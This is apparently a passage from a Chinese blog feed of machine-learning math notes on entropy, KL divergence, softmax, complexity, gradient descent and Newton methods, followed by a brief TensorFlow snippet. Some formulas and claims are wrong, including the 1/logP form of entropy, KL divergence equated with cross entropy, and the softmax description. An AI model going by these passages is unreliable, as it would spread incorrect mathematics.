熵"></a>4.1 熵</h4><p>如果一个随机变量X的可能取值为$X=\left\{ x<em>{1},x</em>{2} ,…..,x<em>{n} \right\}$，其概率分布为$P\left( X=x</em>{i} \right) =p_{i} ,i=1,2,…..,n$，则随机变量X的熵定义为$H(X)$：</p><script type="math/tex; mode=display">H\left( X \right) =-\sum_{i=1}^{n}{P\left( x_{i} \right) logP\left( x_{i} \right) } =\sum_{i=1}^{n}{P\left( x_{i} \right) \frac{1}{logP\left( x_{i} \right) } }</script><h4 id="4-2-联合熵"><a href="#4-2-联合熵" class="headerlink" title="4.2 联合熵"></a>4.2 联合熵</h4><p>两个随机变量X和Y的联合分布可以形成联合熵，定义为联合自信息的数学期望，它是二维随机变量XY的不确定性的度量，用$H(X,Y)$表示：</p><script type="math/tex; mode=display">H\left( X,Y \right) =-\sum_{i=1}^{n}{\sum_{j=1}^{n}{P\left( x_{i} ,y_{j} \right)} logP\left( x_{i},y_{j} \right) }</script><h4 id="4-3-条件熵"><a href="#4-3-条件熵" class="headerlink" title="4.3 条件熵"></a>4.3 条件熵</h4><p>在随机变量$X$发生的前提下，随机变量$Y$发生新带来的熵，定义为$Y$的条件熵，用$H(Y|X)$表示：</p><script type="math/tex; mode=display">H\left(Y|X \right) =-\sum_{x,y}^{}{P\left( x,y \right) logP\left( y|x \right) }</script><p>条件熵用来衡量在已知随机变量$X$的条件下，随机变量$Y$的不确定性。</p><p>实际上，熵、联合熵和条件熵之间存在以下关系：</p><script type="math/tex; mode=display">H\left( Y|X \right) =H\left( X,Y\right) -H\left( X \right)</script><p>推导过程如下：  </p><script type="math/tex; mode=display">\begin{array}{ll}H\left( X,Y\right) -H\left( X \right)\\\ \ \ =-\sum_{x,y}^{}{P(x,y)logP(x,y)}+\sum_{x}p(x)log{p(x)}\\\ \ \ =-\sum_{x,y}^{}{P(x,y)logP(x,y)}+\sum_{x}{(\sum_{y}p(x,y))}log{p(x)}\\\ \ \ =-\sum_{x,y}^{}{P(x,y)logP(y|x)}+\sum_{x,y}p(x,y)log{p(x)}\\\ \ \ =-\sum_{x,y}^{}{P(x,y)}log{\frac{p(x,y)}{p(x)}}\\\ \ \ =-\sum_{x,y}^{}{P(x,y)}logp(y|x)\end{array}</script><p>其中：</p><ul><li>第二行推到第三行的依据是边缘分布$P(x)$等于联合分布$P(x,y)$的和；</li><li>第三行推到第四行的依据是把公因子$logP(x)$乘进去，然后把$x$,$y$写在一起；</li><li>第四行推到第五行的依据是：因为两个sigma都有$P(x,y)$，故提取公因子$P(x,y)$放到外边，然后把里边的$-（log P(x,y) - log P(x)）$写成$- log (P(x,y) / P(x) ) $；</li><li>第五行推到第六行的依据是：$P(x,y) = P(x) * P(y|x)$，故$P(x,y) / P(x) =  P(y|x)$。   </li></ul><h4 id="4-4-相对熵"><a href="#4-4-相对熵" class="headerlink" title="4.4 相对熵"></a>4.4 相对熵</h4><p>相对熵又称互熵、交叉熵、$KL$散度、信息增益，是描述两个概率分布$P$和$Q$差异的一种方法，记为<strong>$D(P||Q)$</strong>。在信息论中，$D(P||Q)$表示当用概率分布$Q$来拟合真实分布P时，产生的信息损耗，其中P表示真实分布，$Q$表示$P$的拟合分布。</p><p>对于一个离散随机变量的两个概率分布$P$和$Q$来说，它们的相对熵定义为：</p><script type="math/tex; mode=display">D\left( P||Q \right) =\sum_{i=1}^{n}{P\left( x_{i} \right) log\frac{P\left( x_{i} \right) }{Q\left( x_{i} \right) } }</script><p>注意：$D(P||Q) ≠ D(Q||P)$</p><p>相对熵又称<strong>$KL$散度($Kullback–Leibler divergence$)</strong>，$KL$散度也是一个机器学习中常考的概念。</p><h4 id="4-5-互信息"><a href="#4-5-互信息" class="headerlink" title="4.5 互信息"></a>4.5 互信息</h4><p>两个随机变量X，Y的互信息定义为X，Y的联合分布和各自独立分布乘积的相对熵称为互信息，用I(X,Y)表示。互信息是信息论里一种有用的信息度量方式，它可以看成是一个随机变量中包含的关于另一个随机变量的信息量，或者说是一个随机变量由于已知另一个随机变量而减少的不肯定性。  </p><script type="math/tex; mode=display">I\left( X,Y \right) =\sum_{x\in X}^{}{\sum_{y\in Y}^{}{P\left( x,y \right) } log\frac{P\left( x,y \right) }{P\left( x \right) P\left( y \right) } }</script><p>互信息、熵和条件熵之间存在以下关系：$ H\left( Y|X \right) =H\left( Y \right) -I\left( X,Y \right) $  </p><p>推导过程如下：</p><p><img src="https://pic3.zhimg.com/v2-6f41bffde009999cbc370f7f38cab092_r.jpg" alt="img"></p><p>通过上面的计算过程发现有：$H(Y|X) = H(Y) - I(X,Y)$，又由前面条件熵的定义有：$H(Y|X) = H(X,Y) - H(X)$，于是有$I(X,Y)= H(X) + H(Y) - H(X,Y)$，此结论被多数文献作为互信息的定义。</p><h3 id="4-6、最大熵模型"><a href="#4-6、最大熵模型" class="headerlink" title="4-6、最大熵模型"></a>4-6、最大熵模型</h3><p>最大熵原理是概率模型学习的一个准则，它认为：学习概率模型时，在所有可能的概率分布中，熵最大的模型是最好的模型。通常用约束条件来确定模型的集合，所以，最大熵模型原理也可以表述为：在满足约束条件的模型集合中选取熵最大的模型。 </p><p>前面我们知道，若随机变量X的概率分布是$P\left( x_{i} \right)$ ，则其熵定义如下：    </p><script type="math/tex; mode=display">H\left( X \right) =-\sum_{i=1}^{n}{P\left( x_{i} \right) logP\left( x_{i} \right) } =\sum_{i=1}^{n}{P\left( x_{i} \right) \frac{1}{logP\left( x_{i} \right) } }</script><p>熵满足下列不等式：</p><script type="math/tex; mode=display">0\leq H\left( X \right) \leq log\left| X \right|</script><p>式中，$|X|$是$X$的取值个数，当且仅当$X$的分布是均匀分布时右边的等号成立。也就是说，当$X$服从均匀分布时，熵最大。</p><p>直观地看，最大熵原理认为：要选择概率模型，首先必须满足已有的事实，即约束条件；在没有更多信息的情况下，那些不确定的部分都是“等可能的”。最大熵原理通过熵的最大化来表示等可能性；“等可能”不易操作，而熵则是一个可优化的指标。</p><h2 id="五、-数值计算"><a href="#五、-数值计算" class="headerlink" title="五、 数值计算"></a>五、 数值计算</h2><h3 id="5-1-上溢和下溢"><a href="#5-1-上溢和下溢" class="headerlink" title="5.1 上溢和下溢"></a>5.1 上溢和下溢</h3><p>在数字计算机上实现连续数学的基本困难是：我们需要通过有限数量的位模式来表示无限多的实数，这意味着我们在计算机中表示实数时几乎都会引入一些近似误差。在许多情况下，这仅仅是舍入误差。如果在理论上可行的算法没有被设计为最小化舍入误差的累积，可能会在实践中失效，因此舍入误差是有问题的，特别是在某些操作复合时。</p><p>一种特别毁灭性的舍入误差是下溢。当接近零的数被四舍五入为零时发生下溢。许多函数会在其参数为零而不是一个很小的正数时才会表现出质的不同。例如，我们通常要避免被零除。</p><p>另一个极具破坏力的数值错误形式是上溢(overflow)。当大量级的数被近似为\varpi 或-\varpi 时发生上溢。进一步的运算通常将这些无限值变为非数字。</p><p>必须对上溢和下溢进行数值稳定的一个例子是softmax 函数。softmax 函数经常用于预测与$multinoulli$分布相关联的概率，定义为：</p><p><img src="https://pic2.zhimg.com/80/v2-7283f680255ba0da3a69f2df58b58ae0_hd.jpg" alt=""></p><p>softmax 函数在多分类问题中非常常见。这个函数的作用就是使得在负无穷到0的区间趋向于0，在0到正无穷的区间趋向于1。上面表达式其实是多分类问题中计算某个样本 $x<em>{i} $的类别标签$ y</em>{i}$ 属于$K$个类别的概率，最后判别$ y_{i}$ 所属类别时就是将其归为对应概率最大的那一个。</p><p>当式中的$w<em>{k} x</em>{i} +b$都是很小的负数时，$e^{w<em>{k} x</em>{i} +b }$ 就会发生下溢，这意味着上面函数的分母会变成0，导致结果是未定的；同理，当式中的$x<em>{w</em>{k} x<em>{i} +b} $是很大的正数时，$e^{w</em>{k} x_{i} +b }$ 就会发生上溢导致结果是未定的。</p><h3 id="5-2-计算复杂性与NP问题"><a href="#5-2-计算复杂性与NP问题" class="headerlink" title="5.2 计算复杂性与NP问题"></a>5.2 计算复杂性与NP问题</h3><h4 id="1-算法复杂性"><a href="#1-算法复杂性" class="headerlink" title="1.算法复杂性"></a>1.算法复杂性</h4><p>现实中大多数问题都是离散的数据集，为了反映统计规律，有时数据量很大，而且多数目标函数都不能简单地求得解析解。这就带来一个问题：算法的复杂性。</p><p>算法理论被认为是解决各类现实问题的方法论。衡量算法有两个重要的指标：时间复杂度和空间复杂度，这是对算法执行所需要的两类资源——时间和空间的估算。</p><p>一般，衡量问题是否可解的重要指标是：该问题能否在多项式时间内求解，还是只能在指数时间内求解？在各类算法理论中，通常使用多项式时间算法即可解决的问题看作是易解问题，需要指数时间算法解决的问题看作是难解问题。</p><p>指数时间算法的计算时间随着问题规模的增长而呈指数化上升，这类问题虽然有解，但并不适用于大规模问题。所以当前算法研究的一个重要任务就是将指数时间算法变换为多项式时间算法。</p><h4 id="2-确定性和非确定性"><a href="#2-确定性和非确定性" class="headerlink" title="2.确定性和非确定性"></a>2.确定性和非确定性</h4><p>除了问题规模与运算时间的比较，衡量一个算法还需要考虑确定性和非确定性的概念。</p><p>这里先介绍一下“自动机”的概念。自动机实际上是指一种基于状态变化进行迭代的算法。在算法领域常把这类算法看作一个机器，比较知名的有图灵机、玻尔兹曼机、支持向量机等。</p><p>所谓确定性，是指针对各种自动机模型，根据当时的状态和输入，若自动机的状态转移是唯一确定的，则称确定性；若在某一时刻自动机有多个状态可供选择，并尝试执行每个可选择的状态，则称为非确定性。</p><p>换个说法就是：确定性是程序每次运行时产生下一步的结果是唯一的，因此返回的结果也是唯一的；非确定性是程序在每个运行时执行的路径是并行且随机的，所有路径都可能返回结果，也可能只有部分返回结果，也可能不返回结果，但是只要有一个路径返回结果，那么算法就结束。</p><p>在求解优化问题时，非确定性算法可能会陷入局部最优。</p><h4 id="3-NP问题"><a href="#3-NP问题" class="headerlink" title="3.NP问题"></a>3.NP问题</h4><p>有了时间上的衡量标准和状态转移的确定性与非确定性的概念，我们来定义一下问题的计算复杂度。</p><p>P类问题就是能够以多项式时间的确定性算法来对问题进行判定或求解，实现它的算法在每个运行状态都是唯一的，最终一定能够确定一个唯一的结果——最优的结果。</p><p>NP问题是指可以用多项式时间的非确定性算法来判定或求解，即这类问题求解的算法大多是非确定性的，但时间复杂度有可能是多项式级别的。</p><p>但是，NP问题还要一个子类称为NP完全问题，它是NP问题中最难的问题，其中任何一个问题至今都没有找到多项式时间的算法。</p><p>机器学习中多数算法都是针对NP问题（包括NP完全问题）的。</p><h3 id="5-3-数值计算"><a href="#5-3-数值计算" class="headerlink" title="5.3 数值计算"></a>5.3 数值计算</h3><p>上面已经分析了，大部分实际情况中，计算机其实都只能做一些近似的数值计算，而不可能找到一个完全精确的值，这其实有一门专门的学科来研究这个问题，这门学科就是——数值分析（有时也叫作“计算方法”）；运用数值分析解决问题的过程为：实际问题→数学模型→数值计算方法→程序设计→上机计算求出结果。</p><p>计算机在做这些数值计算的过程中，经常会涉及到的一个东西就是“迭代运算”，即通过不停的迭代计算，逐渐逼近真实值（当然是要在误差收敛的情况下）。</p><h2 id="六、最优化"><a href="#六、最优化" class="headerlink" title="六、最优化"></a>六、最优化</h2><p>本节介绍机器学习中的一种重要理论——最优化方法。</p><h3 id="6-1-最优化理论"><a href="#6-1-最优化理论" class="headerlink" title="6.1 最优化理论"></a>6.1 最优化理论</h3><p>无论做什么事，人们总希望以最小的代价取得最大的收益。在解决一些工程问题时，人们常会遇到多种因素交织在一起与决策目标相互影响的情况；这就促使人们创造一种新的数学理论来应对这一挑战，也因此，最早的优化方法——线性规划诞生了。</p><p>在李航博士的《统计学习方法》中，其将机器学习总结为如下表达式：</p><p>机器学习 = 模型 + 策略 + 算法</p><p>可以看得出，算法在机器学习中的 重要性。实际上，这里的算法指的就是优化算法。在面试机器学习的岗位时，优化算法也是一个特别高频的问题，大家如果真的想学好机器学习，那还是需要重视起来的。</p><h3 id="6-2-最优化问题的数学描述"><a href="#6-2-最优化问题的数学描述" class="headerlink" title="6.2 最优化问题的数学描述"></a>6.2 最优化问题的数学描述</h3><p>最优化的基本数学模型如下：</p><p><img src="https://pic3.zhimg.com/80/v2-f35226b3e0fa018db6a4b233c51eccbe_hd.jpg" alt=""></p><p>它有三个基本要素，即：</p><p>设计变量：$x$是一个实数域范围内的$n$维向量，被称为决策变量或问题的解；<br>目标函数：$f(x)$为目标函数；<br>约束条件：$h<em>{i} \left( x \right) =0$称为等式约束，$g</em>{i} \left( x \right) \leq 0$为不等式约束，$i=0,1,2,……$</p><h3 id="6-3-凸集与凸集分离定理"><a href="#6-3-凸集与凸集分离定理" class="headerlink" title="6.3 凸集与凸集分离定理"></a>6.3 凸集与凸集分离定理</h3><h4 id="1-凸集"><a href="#1-凸集" class="headerlink" title="1.凸集"></a>1.凸集</h4><p>实数域R上（或复数C上）的向量空间中，如果集合S中任两点的连线上的点都在S内，则称集合S为凸集，如下图所示：</p><p><img src="https://pic1.zhimg.com/80/v2-608f89f47688c41e4c3f83cfad095c84_hd.jpg" alt=""></p><p>数学定义为：</p><p>设集合$D\subset R^{n} $，若对于任意两点$x,y\in D$，及实数$\lambda \left( 0\leq \lambda \leq 1 \right)$ 都有：   </p><script type="math/tex; mode=display">\lambda x+\left( 1-\lambda \right) y\in D</script><p>则称集合$D$为凸集。</p><h4 id="2-超平面和半空间"><a href="#2-超平面和半空间" class="headerlink" title="2.超平面和半空间"></a>2.超平面和半空间</h4><p>实际上，二维空间的超平面就是一条线（可以使曲线），三维空间的超平面就是一个面（可以是曲面）。其数学表达式如下：</p><p>超平面：$H=\left\{ x\in R^{n} |a<em>{1} +a</em>{2}+…+a_{n} =b \right\} $</p><p>半空间：$H^{+} =\left\{ x\in R^{n} |a<em>{1} +a</em>{2}+…+a_{n} \geq b \right\} $ </p><h4 id="3-凸集分离定理"><a href="#3-凸集分离定理" class="headerlink" title="3.凸集分离定理"></a>3.凸集分离定理</h4><p>所谓两个凸集分离，直观地看是指两个凸集合没有交叉和重合的部分，因此可以用一张超平面将两者隔在两边，如下图所示：</p><p><img src="https://pic1.zhimg.com/80/v2-4116a3bda12faa5e2421ce27efb7fb71_hd.jpg" alt=""></p><h4 id="4-凸函数"><a href="#4-凸函数" class="headerlink" title="4.凸函数"></a>4.凸函数</h4><p>凸函数就是一个定义域在某个向量空间的凸子集C上的实值函数。</p><p><img src="https://pic2.zhimg.com/80/v2-f1b39d0aad4388433158679221f813d2_hd.jpg" alt=""></p><p>数学定义为： </p><p>对于函数$f(x)$，如果其定义域$C$是凸的，且对于$∀x,y∈C，0\leq \alpha \leq 1$，<br> 有：  </p><script type="math/tex; mode=display">f\left( \theta x+\left( 1-\theta \right) y \right) \leq \theta f\left( x \right) +\left( 1-\theta \right) f\left( y \right)</script><p>则$f(x)$是凸函数。</p><p>注：如果一个函数是凸函数，则其局部最优点就是它的全局最优点。这个性质在机器学习算法优化中有很重要的应用，因为机器学习模型最后就是在求某个函数的全局最优点，一旦证明该函数（机器学习里面叫“损失函数”）是凸函数，那相当于我们只用求它的局部最优点了。</p><h3 id="6-4-梯度下降算法"><a href="#6-4-梯度下降算法" class="headerlink" title="6.4 梯度下降算法"></a>6.4 梯度下降算法</h3><h4 id="1-引入"><a href="#1-引入" class="headerlink" title="1.引入"></a>1.引入</h4><p>前面讲数值计算的时候提到过，计算机在运用迭代法做数值计算（比如求解某个方程组的解）时，只要误差能够收敛，计算机最后经过一定次数的迭代后是可以给出一个跟真实解很接近的结果的。</p><p>这里进一步提出一个问题，如果我们得到的目标函数是非线性的情况下，按照哪个方向迭代求解误差的收敛速度会最快呢？</p><p>答案就是沿梯度方向。这就引入了我们的梯度下降法。</p><h4 id="2-梯度下降法"><a href="#2-梯度下降法" class="headerlink" title="2.梯度下降法"></a>2.梯度下降法</h4><p>在多元微分学中，梯度就是函数的导数方向。</p><p>梯度法是求解无约束多元函数极值最早的数值方法，很多机器学习的常用算法都是以它作为算法框架，进行改进而导出更为复杂的优化方法。</p><p>在求解目标函数f\left( x \right) 的最小值时，为求得目标函数的一个凸函数，在最优化方法中被表示为：</p><script type="math/tex; mode=display">minf\left( x \right)</script><p>根据导数的定义，函数$f\left( x \right) $的导函数就是目标函数在$x$上的变化率。在多元的情况下，目标函数$f\left( x,y,z \right) $在某点的梯度$grad f\left( x,y,z \right) =\left( \frac{\partial f}{\partial x},\frac{\partial f}{\partial y},\frac{\partial f}{\partial z} \right)$ 是一个由各个分量的偏导数构成的向量，负梯度方向是$f\left( x,y,z \right) $减小最快的方向。</p><p><img src="https://pic4.zhimg.com/80/v2-e61c38f10e34badf5b2c1f3b9c9bcfa0_hd.jpg" alt=""></p><p>如上图所示，当需要求$f\left( x \right) $的最小值时（机器学习中的$f\left( x \right) $一般就是损失函数，而我们的目标就是希望损失函数最小化），我们就可以先任意选取一个函数的初始点$x<em>{0} $（三维情况就是$\left( x</em>{0} ,y<em>{0} ,z</em>{0} \right)$ ），让其沿着途中红色箭头（负梯度方向）走，依次到$x<em>{1} ，x</em>{2} ，…，x_{n} $（迭代n次）这样可最快达到极小值点。</p><p>梯度下降法过程如下：</p><p>输入：目标函数$f\left( x \right) $，梯度函数$g\left( x \right) =grad f\left( x \right) $，计算精度$\varepsilon $</p><p>输出：$f\left( x \right) 的极小值点x^{*} $</p><ol><li>任取取初始值$x_{0}$ ，置$k=0$；</li><li>计算$f\left( x_{k} \right) $；</li><li>计算梯度$g<em>{k} =grad f\left( x</em>{k} \right) $，当$\left| \left| g<em>{k} \right| \right| &lt;\varepsilon $时停止迭代，令$x^{*} =x</em>{k}$ ；</li><li>否则令$P<em>{k} =-g</em>{k}$ ，求$\lambda <em>{k} 使f\left( x</em>{k+1} \right) =minf\left( x<em>{k} +\lambda </em>{k} P_{k} \right) $；</li><li>置$x<em>{k+1} =x</em>{k} +\lambda <em>{k} P</em>{k} $，计算$f\left( x<em>{k+1}\right) $，当$\left| \left| f\left( x</em>{k+1}\right) -f\left( x<em>{k}\right) \right| \right| &lt;\varepsilon 或\left| \left| x</em>{k+1} -x<em>{k} \right| \right| &lt;\varepsilon $时，停止迭代，令$x^{*} =x</em>{k+1}  $；</li><li>否则，置$k=k+1$，转$3$。</li></ol><h3 id="6-5-随机梯度下降算法"><a href="#6-5-随机梯度下降算法" class="headerlink" title="6.5 随机梯度下降算法"></a>6.5 随机梯度下降算法</h3><p>上面可以看到，在梯度下降法的迭代中，除了梯度值本身的影响外，还有每一次取的步长\lambda _{k} 也很关键：步长值取得越大，收敛速度就会越快，但是带来的可能后果就是容易越过函数的最优点，导致发散；步长取太小，算法的收敛速度又会明显降低。因此我们希望找到一种比较好的方法能够平衡步长。</p><p>随机梯度下降法并没有新的算法理论，仅仅是引进了随机样本抽取方式，并提供了一种动态步长取值策略。目的就是又要优化精度，又要满足收敛速度。</p><p>也就是说，上面的批量梯度下降法每次迭代时都会计算训练集中所有的数据，而随机梯度下降法每次迭代只是随机取了训练集中的一部分样本数据进行梯度计算，这样做最大的好处是可以避免有时候陷入局部极小值的情况（因为批量梯度下降法每次都使用全部数据，一旦到了某个局部极小值点可能就停止更新了；而随机梯度法由于每次都是随机取部分数据，所以就算局部极小值点，在下一步也还是可以跳出）</p><p>两者的关系可以这样理解：随机梯度下降方法以损失很小的一部分精确度和增加一定数量的迭代次数为代价，换取了总体的优化效率的提升。增加的迭代次数远远小于样本的数量。</p><h3 id="6-6-牛顿法"><a href="#6-6-牛顿法" class="headerlink" title="6.6 牛顿法"></a>6.6 牛顿法</h3><h4 id="1-牛顿法介绍"><a href="#1-牛顿法介绍" class="headerlink" title="1.牛顿法介绍"></a>1.牛顿法介绍</h4><p>牛顿法也是求解无约束最优化问题常用的方法，最大的优点是收敛速度快。</p><p>从本质上去看，牛顿法是二阶收敛，梯度下降是一阶收敛，所以牛顿法就更快。通俗地说，比如你想找一条最短的路径走到一个盆地的最底部，梯度下降法 每次只从你当前所处位置选一个坡度最大的方向走一步，牛顿法在选择方向时，不仅会考虑坡度是否够大，还会考虑你走了一步之后，坡度是否会变得更大。所以， 可以说牛顿法比梯度下降法看得更远一点，能更快地走到最底部。</p><p><img src="https://pic3.zhimg.com/80/v2-e22ea8c565434e945a17a80bec5630b6_hd.jpg" alt=""><br>或者从几何上说，牛顿法就是用一个二次曲面去拟合你当前所处位置的局部曲面，而梯度下降法是用一个平面去拟合当前的局部曲面，通常情况下，二次曲面的拟合会比平面更好，所以牛顿法选择的下降路径会更符合真实的最优下降路径。</p><h4 id="2-牛顿法的推导"><a href="#2-牛顿法的推导" class="headerlink" title="2.牛顿法的推导"></a>2.牛顿法的推导</h4><p>将目标函数$f\left( x \right)  在x_{k}$ 处进行二阶泰勒展开，可得：   </p><script type="math/tex; mode=display">f\left( x \right) =f\left( x_{k} \right) +f^{'} \left( x_{k} \right) \left( x-x_{k} \right) +\frac{1}{2} f^{''}\left( x_{k} \right) \left( x-x_{k} \right) ^{2}</script><p>因为目标函数$f\left( x \right)$ 有极值的必要条件是在极值点处一阶导数为0，即：$f^{‘} \left( x \right) =0 $</p><p>所以对上面的展开式两边同时求导（注意$x$才是变量，$x<em>{k}$ 是常量$\Rightarrow f^{‘} \left( x</em>{k} \right) ,f^{‘’} \left( x_{k} \right)$ 都是常量），并令$f^{‘} \left( x \right) =0$可得：  </p><script type="math/tex; mode=display">f^{'} \left( x_{k} \right) +f^{''} \left( x_{k} \right) \left( x-x_{k} \right) =0</script><p>即：   </p><script type="math/tex; mode=display">x=x_{k} -\frac{f^{'} \left( x_{k} \right) }{f^{''} \left( x_{k} \right) }</script><p>于是可以构造如下的迭代公式：</p><script type="math/tex; mode=display">x_{k+1} =x_{k} -\frac{f^{'} \left( x_{k} \right) }{f^{''} \left( x_{k} \right) }</script><p>这样，我们就可以利用该迭代式依次产生的序列$\left\{x<em>{1},x</em>{2},…., x_{k} \right\} $才逐渐逼近$f\left( x \right)$ 的极小值点了。</p><p>牛顿法的迭代示意图如下：</p><p><img src="https://pic1.zhimg.com/80/v2-e908f9721cc82415fa7e70c763351f3a_hd.jpg" alt=""></p><p>上面讨论的是2维情况，高维情况的牛顿迭代公式是：</p><p>式中，$ ▽f是f\left( x \right)$ 的梯度，即：</p><p><img src="https://pic4.zhimg.com/80/v2-71df54a8e32e172596dcaa07e6b31899_hd.jpg" alt=""></p><p>H是Hessen矩阵，即：</p><p><img src="https://pic4.zhimg.com/80/v2-2891044fd02769c3148649e2a1a01fd5_hd.jpg" alt=""></p><h4 id="3-牛顿法的过程"><a href="#3-牛顿法的过程" class="headerlink" title="3.牛顿法的过程"></a>3.牛顿法的过程</h4><ol><li>给定初值$x_{0} $和精度阈值$\varepsilon $，并令$k=0$；</li><li>计算$x<em>{k} $和$H</em>{k}$ ；</li><li>若$\left| \left| g<em>{k} \right| \right| &lt;\varepsilon $则停止迭代；否则确定搜索方向：$d</em>{k} =-H<em>{k}^{-1} \cdot g</em>{k}$ ；</li><li>计算新的迭代点：$x<em>{k+1} =x</em>{k} +d_{k} $；</li><li>令$k=k+1$，转至$2$。</li></ol><h3 id="6-7-阻尼牛顿法"><a href="#6-7-阻尼牛顿法" class="headerlink" title="6.7 阻尼牛顿法"></a>6.7 阻尼牛顿法</h3><h4 id="1-引入-1"><a href="#1-引入-1" class="headerlink" title="1.引入"></a>1.引入</h4><p>注意到，牛顿法的迭代公式中没有步长因子，是定步长迭代。对于非二次型目标函数，有时候会出现$f\left( x<em>{k+1} \right) &gt;f\left( x</em>{k} \right) $的情况，这表明，原始牛顿法不能保证函数值稳定的下降。在严重的情况下甚至会造成序列发散而导致计算失败。</p><p>为消除这一弊病，人们又提出阻尼牛顿法。阻尼牛顿法每次迭代的方向仍然是$x<em>{k} $，但每次迭代会沿此方向做一维搜索，寻求最优的步长因子$\lambda </em>{k}$ ，即：</p><p>$\lambda <em>{k} = minf\left( x</em>{k} +\lambda d_{k} \right) $</p><h4 id="2-算法过程"><a href="#2-算法过程" class="headerlink" title="2.算法过程"></a>2.算法过程</h4><ol><li>给定初值$x_{0}$ 和精度阈值$\varepsilon$ ，并令$k=0$；</li><li>计算$g<em>{k} （f\left( x \right) $在$x</em>{k}$ 处的梯度值）和$H_{k} $；</li><li>若$\left| \left| g<em>{k} \right| \right| &lt;\varepsilon $则停止迭代；否则确定搜索方向：$d</em>{k} =-H<em>{k}^{-1} \cdot g</em>{k}$ ；</li><li>利用$d<em>{k} =-H</em>{k}^{-1} \cdot g<em>{k} 得到步长\lambda </em>{k} $，并令$x<em>{k+1} =x</em>{k} +\lambda <em>{k} d</em>{k}$  </li><li>令$k=k+1$，转至$2$。</li></ol><h3 id="6-8-拟牛顿法"><a href="#6-8-拟牛顿法" class="headerlink" title="6.8 拟牛顿法"></a>6.8 拟牛顿法</h3><h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h4><p>由于牛顿法每一步都要求解目标函数的Hessen矩阵的逆矩阵，计算量比较大（求矩阵的逆运算量比较大），因此提出一种改进方法，即通过正定矩阵近似代替Hessen矩阵的逆矩阵，简化这一计算过程，改进后的方法称为拟牛顿法。</p><h4 id="2-拟牛顿法的推导"><a href="#2-拟牛顿法的推导" class="headerlink" title="2.拟牛顿法的推导"></a>2.拟牛顿法的推导</h4><p>先将目标函数在$x_{k+1} $处展开，得到：  </p><script type="math/tex; mode=display">f\left( x \right) =f\left( x_{k+1} \right) +f^{'} \left( x_{k+1} \right) \left( x-x_{k+1} \right) +\frac{1}{2} f^{''}\left( x_{k+1} \right) \left( x-x_{k+1} \right) ^{2}</script><p>两边同时取梯度，得：  </p><script type="math/tex; mode=display">f^{'}\left( x \right) = f^{'} \left( x_{k+1} \right) +f^{''} \left( x_{k+1} \right) \left( x-x_{k+1} \right)</script><p>取上式中的$x=x_{k}$ ，得：   </p><script type="math/tex; mode=display">f^{'}\left( x_{k} \right) = f^{'} \left( x_{k+1} \right) +f^{''} \left( x_{k+1} \right) \left( x-x_{k+1} \right)</script><p>即：   </p><script type="math/tex; mode=display">g_{k+1} -g_{k} =H_{k+1} \cdot \left( x_{k+1} -x_{k} \right)</script><p>可得：  </p><script type="math/tex; mode=display">H_{k}^{-1} \cdot \left( g_{k+1} -g_{k} \right) =x_{k+1} -x_{k}</script><p>上面这个式子称为“拟牛顿条件”，由它来对$Hessen$矩阵做约束。</p>]]></content>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2-1创建图 启动图</title>
      <link href="/2017/12/26/2-1%E5%88%9B%E5%BB%BA%E5%9B%BE%20%E5%90%AF%E5%8A%A8%E5%9B%BE/"/>
      <url>/2017/12/26/2-1%E5%88%9B%E5%BB%BA%E5%9B%BE%20%E5%90%AF%E5%8A%A8%E5%9B%BE/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m1=tf.constant([[<span class="number">3</span>,<span class="number">3</span>]])</span><br><span class="line">m2=tf.constant([[<span class="number">2</span>],[<span class="number">3</span>]])</span><br><span class="line">product=tf.matmul(m1,m2)</span><br><span class="line">print(product)</span><br></pre></td></tr></table></figure><pre><code>Tensor(&quot;MatMul_1:0&quot;, shape=(1, 1), dtype=int32)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sess=tf.Session()</span><br><span class="line">result=sess.run(product)</span><br><span class="line">print(result)</span><br><span class="line">sess.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    result=sess.run(product)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> Python学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>万万没想到：用理工科思维理解世界</title>
      <link href="/2017/12/13/%E4%B8%87%E4%B8%87%E6%B2%A1%E6%83%B3%E5%88%B0%EF%BC%9A%E7%94%A8%E7%90%86%E5%B7%A5%E7%A7%91%E6%80%9D%E7%BB%B4%E7%90%86%E8%A7%A3%E4%B8%96%E7%95%8C/"/>
      <url>/2017/12/13/%E4%B8%87%E4%B8%87%E6%B2%A1%E6%83%B3%E5%88%B0%EF%BC%9A%E7%94%A8%E7%90%86%E5%B7%A5%E7%A7%91%E6%80%9D%E7%BB%B4%E7%90%86%E8%A7%A3%E4%B8%96%E7%95%8C/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一篇读书笔记。<br><a id="more"></a></p><h2 id="《万万没想到：用理工科思维理解世界》"><a href="#《万万没想到：用理工科思维理解世界》" class="headerlink" title="《万万没想到：用理工科思维理解世界》"></a>《万万没想到：用理工科思维理解世界》</h2><ul><li>作者：万维钢（同人于野）<br><em>Unconventional wisdom</em></li></ul><h3 id="Part-one-反常识思维"><a href="#Part-one-反常识思维" class="headerlink" title="Part one 反常识思维"></a><strong>Part one 反常识思维</strong></h3><h4 id="1．“反常识”思维"><a href="#1．“反常识”思维" class="headerlink" 